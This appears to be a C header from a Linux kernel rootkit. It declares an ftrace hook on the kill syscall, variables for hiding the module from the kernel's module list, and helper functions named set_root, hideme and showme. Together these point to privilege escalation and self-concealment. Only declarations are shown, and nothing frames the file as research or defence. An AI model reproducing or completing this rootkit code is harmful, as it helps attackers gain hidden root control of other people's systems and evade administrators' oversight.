#include "ftrace_hook.h"


#include <linux/string.h>


// variables for module hiding
struct list_head *prev_module;
short hidden = 1;


// hooked syscalls
asmlinkage long (*orig_kill)(const struct pt_regs *);
// asmlinkage long (*orig_delete_module)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs);
// asmlinkage int hook_delete_module(const struct pt_regs *regs);


// helper functions
void set_root(void);
void showme(void);
void hideme(void);